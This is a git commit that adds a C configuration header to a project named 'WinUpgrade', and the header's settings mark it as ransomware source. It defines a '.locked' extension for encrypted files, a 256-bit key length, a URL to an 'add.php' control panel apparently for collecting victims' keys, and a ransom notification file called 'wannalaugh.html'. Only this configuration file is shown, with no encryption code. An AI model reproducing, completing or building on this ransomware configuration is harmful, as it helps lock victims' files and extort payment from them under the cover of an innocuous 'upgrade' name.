02fa0410344892a49f24564dcc97af789cedd306
maths644311798 <37217854+maths644311798@users.noreply.github.com>
2019-04-19 09:57:02 +0800

    Add files via upload

---
+++ WinUpgrade/config.h
@@ -0,0 +1,24 @@
+/*
+ * Extension for all locked files
+ */
+#define LOCKED_EXTENSION ".locked"
+
+/*
+ * Key length in bytes, default is 32 (256 bits)
+ */
+#define KEY_LEN 32 // 256 bits
+
+/*
+ * URL to add.php
+ */
+#define URL_PANEL "http://localhost/add.php"
+
+/*
+ * If notification file should be created
+ */
+#define OPEN_FILE true
+
+/*
+ * Notification file name
+ */
+#define NOTIFY_FILENAME "wannalaugh.html"
